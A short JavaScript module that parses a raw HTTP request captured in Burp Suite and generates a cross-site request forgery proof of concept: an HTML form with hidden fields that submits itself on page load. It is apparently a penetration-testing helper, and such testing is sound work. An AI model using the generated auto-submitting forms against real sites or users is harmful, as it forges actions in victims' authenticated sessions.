const parseBurpRequest = (burpRequest) => {
    const lines = burpRequest.split('\n');
    const [method, url] = lines[0].split(' ');
    const headers = {};
    const params = {};
  
    let isBody = false;
    lines.slice(1).forEach((line) => {
      if (line === '') {
        isBody = true;
      } else if (isBody) {
        line.split('&').forEach((param) => {
          const [key, value] = param.split('=');
          params[key] = value;
        });
      } else {
        const [key, value] = line.split(': ');
        headers[key] = value;
      }
    });
  
    return { method, url, headers, params };
  };
  
  const generatePoC = (burpRequest) => {
    const { method, url, params } = parseBurpRequest(burpRequest);
    const paramEntries = Object.entries(params).map(([key, value]) => (
      `<input type="hidden" name="${key}" value="${value}">`
    )).join('\n');
  
    const form = `
      <form action="${url}" method="${method}">
        ${paramEntries}
        <input type="submit" value="Submit">
      </form>
      <script>document.forms[0].submit();</script>
    `;
  
    return form;
  };
  
  export { generatePoC };
  